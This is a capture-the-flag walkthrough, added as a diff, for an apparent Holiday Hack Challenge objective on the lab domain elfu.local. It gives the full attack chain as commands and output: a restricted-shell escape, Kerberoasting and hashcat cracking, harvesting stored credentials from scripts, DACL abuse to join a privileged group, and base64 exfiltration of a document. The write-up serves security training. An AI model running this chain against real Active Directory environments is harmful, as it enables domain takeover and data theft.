@@ -1,0 +1,273 @@
+https://register.elfu.org/register
+Objective: Obtain secret sleigh research document and get the first ingredient.
+Hints:
+  Admins often store credentials in scripts. Steal them!
+  CeWL can generate a wordlist for password cracking.
+  10.X.X.X networks in routing table may be interesting.
+  Use nmap with -PS22,445 to find things that unprivileged scans can miss.
+References:
+  https://www.youtube.com/watch?v=iMh8FTzepU4
+  https://github.com/chrisjd20/hhc21_powershell_snippets
+  https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+  https://github.com/NotSoSecure/password_cracking_rules
+  https://github.com/irgoncalves/smbclient_cheatsheet
+  https://github.com/BloodHoundAD/BloodHound
+  https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf
+  https://social.technet.microsoft.com/Forums/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
+
+
+(Register to get a user account. Note it resets each day.)
+ElfU Registration Portal
+New Student Domain Account Creation Successful!
+You can now access the student network grading system by SSH'ing into this asset using the command below:
+ssh wxomrvazsc@grades.elfu.org -p 2222
+ElfU Domain Username: wxomrvazsc
+ElfU Domain Password: Nzibrurie@
+
+
+(Connect to the system)
+~$ ssh wxomrvazsc@grades.elfu.org -p 2222
+  ===================================================
+  =      Elf University Student Grades Portal       =
+  =          (Reverts Everyday 12am EST)            =
+  ===================================================
+  1. Print Current Courses/Grades.
+  e. Exit
+  :
+
+
+(Looks like some kind of shell.)
+(Ctrl+C => You may only type 'exit' to leave the exam!)
+(Ctrl+D => Traceback ... and ends with a >>> prompt)
+(>>> looks like python's IDLE Shell prompt so use the subprocess library to get bash)
+>>> import subprocess
+>>> subprocess.run("/bin/sh", shell=True)
+
+
+(That gives me the $ prompt meaning we have bash shell)
+(Look around on the routing table for IP address to scan)
+~$ route
+  Kernel IP routing table
+  Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+  default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
+  10.128.1.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
+  10.128.2.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
+  10.128.3.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
+  172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
+
+
+(Scan the 10.X.X.X range for open domain controller ports)
+(88 = Kerberos auth)
+(389 = LDAP client to DC)
+~$ nmap -p 88,389 10.128.1-3.* | grep -B 8 open
+  PORT    STATE  SERVICE
+  88/tcp  closed kerberos-sec
+  389/tcp closed ldap
+
+  Nmap scan report for 10.128.3.30
+  Host is up (0.00026s latency).
+
+  PORT    STATE SERVICE
+  88/tcp  open  kerberos-sec
+  389/tcp open  ldap
+
+
+(10.128.3.30 seems to be it. Access it with SMB)
+(-U <username>%<password>)
+~$ smbclient -U wxomrvazsc%Nzibrurie@ -L 10.128.3.30
+  Enter WORKGROUP\sqjqpwsacc's password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        netlogon        Disk
+        sysvol          Disk
+        elfu_svc_shr    Disk      elfu_svc_shr
+        research_dep    Disk      research_dep
+        IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+  SMB1 disabled -- no workgroup available
+
+
+(Try to access the research_dep)
+~$ smbclient -U wxomrvazsc%Nzibrurie@ \\\\10.128.3.30\\research_dep
+  tree connect failed: NT_STATUS_ACCESS_DENIED
+
+
+(Access sysvol for domain name for some kerberoasting)
+~$ smbclient -U wxomrvazsc%Nzibrurie@ \\\\10.128.3.30\\sysvol
+smb: \> ls
+  .                                   D        0  Fri Oct 29 19:29:49 2021
+  ..                                  D        0  Thu Aug 24 08:03:16 2023
+  elfu.local                          D        0  Fri Oct 29 19:29:49 2021
+
+                41089256 blocks of size 1024. 34899188 blocks available
+smb: \> exit
+
+
+(Find if GetUserSPNs.py is anywhere)
+~$ find / -name GetUserSPNs.py 2>/dev/null
+  /usr/local/bin/GetUserSPNs.py
+
+
+(https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#kerberoasting)
+~$ python3 /usr/local/bin/GetUserSPNs.py elfu.local/wxomrvazsc:Nzibrurie@ -outputfile out.txt
+  Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+  ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon  Delegation
+  -----------------------------------  --------  --------  --------------------------  ---------  ----------
+  ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  <never>
+  ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  <never>
+  ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  <never>
+  ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  <never>
+
+
+(Outputfile has the password hash)
+~$ cat out.txt
+  $krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$9b2ed56b52df099......
+
+
+(For password cracking, get wordlist with CeWL)
+~$ cewl --with-numbers https://register.elfu.org/register > wordlist.txt
+
+
+(Get the rule from https://github.com/NotSoSecure/password_cracking_rules)
+(Crack with hashcat)
+~$ hashcat -m 13100 -a 0 out.txt wordlist.txt -r OneRuleToRuleThemAll.rule
+
+
+(Password = Snow2021!)
+(Access one of the shares the service account has access to)
+~$ smbclient -U elfu_svc%Snow2021! \\\\10.128.3.30\\elfu_svc_shr
+smb: \> ls
+
+
+(Lot of scripts. Download all without prompting to grep for left behind passwords.)
+smb: \> prompt off
+smb: \> mget *
+smb: \> exit
+~$ grep -i password * | less
+  ...
+  ...
+  GetProcessInfo.ps1:$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+  ...
+  ...
+
+
+(See what is in GetProcessInfo.ps1)
+~$ cat GetProcessInfo.ps1
+  $SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+  $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+  $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+  Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
+
+
+(Start a powershell session)
+~$ pwsh
+
+
+(Run the first three lines of GetProcessInfo.ps1 to set up credentials and then access 10.128.1.53)
+PS> $SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+
+PS> $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+
+PS> $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+
+PS> Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Negotiate
+
+
+(List Active Directory groups)
+PS> Get-ADGroup -Filter * | sort | Select-Object -Property Name
+  ...
+  ...
+  Research Department
+  ...
+  ...
+
+
+(Get details on that AD group)
+PS> Get-ADGroup -Filter {Name -eq 'Research Department'}
+  DistinguishedName : CN=Research Department,CN=Users,DC=elfu,DC=local
+  GroupCategory     : Security
+  GroupScope        : Global
+  Name              : Research Department
+  ObjectClass       : group
+  ObjectGUID        : 8dd5ece3-bdc8-4d02-9356-df01fb0e5f3d
+  SamAccountName    : ResearchDepartment
+  SID               : S-1-5-21-2037236562-2033616742-1485113978-1108
+
+
+(See if current user, remote_elf, has DACL editing permissions)
+(https://github.com/chrisjd20/hhc21_powershell_snippets)
+PS> $ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+PS> $ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount]) | Select-Object -Property ActiveDirectoryRights,IdentityReference
+  ...
+  ...
+  WriteDacl ELFU\remote_elf
+  ...
+  ...
+
+
+(Snippet for "GenericAll" permission from chrisjd20's github)
+(Modified for Research Department, wxomrvazsc, and elfu.local)
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$username = "wxomrvazsc"
+$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+$secOptions = $domainDirEntry.get_Options()
+$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
+$domainDirEntry.RefreshCache()
+$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+
+
+(Snippet for adding user to AD group from chrisjd20's github)
+(Modified for Research Department, wxomrvazsc, and elfu.local)
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$username = "wxomrvazsc"
+$password = "Nzibrurie@"
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
+$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
+$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
+$b=New-Object byte[] $sid.BinaryLength
+$sid.GetBinaryForm($b,0)
+$hexSID=[BitConverter]::ToString($b).Replace('-','')
+$domainDirEntry.Add("LDAP://<SID=$hexSID>")
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+
+
+(Exit out to bash shell)
+PS> exit
+PS> exit
+
+
+(Access the research_dep folder)
+~$ smbclient -U wxomrvazsc%Nzibrurie@ \\\\10.128.3.30\\research_dep
+smb: \> ls
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Thu Aug 24 08:03:11 2023
+  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
+
+                41089256 blocks of size 1024. 34894660 blocks available
+
+
+(Download the PDF)
+smb: \> get SantaSecretToAWonderfulHolidaySeason.pdf
+
+
+(Exit to bash shell and convert to base64 for exfiltration)
+smb: \> exit
+~$ base64 -w 0 SantaSecretToAWonderfulHolidaySeason.pdf
+
+
+(Copy and paste into a txt file on local machine and convert back to pdf)
+~$ base64 -d SantaSecretBase64.txt > SantaSecretToAWonderfulHolidaySeason.pdf
+
+
+Answer: Kindness
